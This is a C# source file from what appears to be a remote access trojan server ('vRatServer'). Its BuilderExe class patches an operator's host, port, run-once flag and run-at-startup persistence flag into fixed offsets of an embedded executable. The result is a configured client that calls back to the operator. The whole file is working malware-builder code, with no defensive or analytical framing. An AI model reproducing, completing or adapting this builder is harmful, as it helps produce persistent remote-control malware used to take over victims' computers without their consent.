﻿using System;
using System.Collections.Generic;
using System.Text;
using System.Linq;

namespace vRatServer.Classes
{
    public class BuilderExe
    {
        static int baseoffset = 0x9a00;
        int host_offset = baseoffset + 0x40;
        int port_ofsset= baseoffset + 0x1d0;
        int runOnce_offset= baseoffset+4;
        int runStartup_offset= baseoffset;

        public BuilderExe(string host,ushort port,bool runOnce,bool runOnStartup)
        {
            byte[] portb = BitConverter.GetBytes(port);
            
            byte[] y = new byte[] { 0x01, 0x00, 0x00, 0x00 };
            byte[] n = new byte[] { 0x00, 0x00, 0x00, 0x00 };


            byte[] hostb = Encoding.ASCII.GetBytes(host).Concat(n).ToArray();


            Array.Copy(hostb, 0, Exe.rawData, host_offset, hostb.Length);
            Array.Copy(portb, 0, Exe.rawData, port_ofsset, portb.Length);

            if (runOnce)
            {
                Array.Copy(y, 0, Exe.rawData, runOnce_offset, 4);

            }
            else
            {
                Array.Copy(n, 0, Exe.rawData, runOnce_offset, 4);

            }

            if (runOnStartup)
            {
                Array.Copy(y, 0, Exe.rawData, runStartup_offset, 4);
            }
            else
            {
                Array.Copy(n, 0, Exe.rawData, runStartup_offset, 4);
            }
            


        }
    }
}
